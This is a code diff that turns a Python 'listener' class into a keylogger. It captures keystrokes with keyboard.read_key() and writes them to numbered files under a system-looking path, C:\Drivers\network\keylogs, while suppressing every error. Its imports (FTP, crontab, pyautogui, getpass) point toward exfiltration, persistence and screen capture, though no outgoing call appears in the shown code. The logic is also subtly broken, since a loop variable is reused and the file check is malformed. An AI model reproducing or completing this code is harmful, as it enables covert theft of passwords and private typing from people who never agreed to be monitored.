@@ -1,12 +1,14 @@
 import os
 import ftplib
-#import cv2
+import cv2
 import platform
 import getpass
 import sys
 import threading
 import pyautogui
 import time
+import keyboard
+from ftplib import FTP
 from crontab import CronTab
 
 class listener():
@@ -14,12 +16,20 @@ class listener():
     #log keys and if there is an error pass
     def log_keys(self):
         try:
-            #generate the text file for logging keys
-            with open("logged_text.txt", 'w') as file:
-                #add to this later
-                print()
-
-            #activate the listener
+            
+            os.chdir('C:\\Drivers\\network\\keylogs')
+            x = 1
+            while True:
+                if (str('logged_text' + str(x)) in str(os.listdir()) + '\\keylogs'):
+                    x += 1
+                else:
+                    #generate the text file for logging keys
+                    with open("logged_text" + str(x) + ".txt", 'w+') as file:
+                        #while the number of characters is less than 300
+                        for x in range(300):
+                            file.write(keyboard.read_key())
+                            file.write('\n')
+                        file.close()
         except:
 
             pass
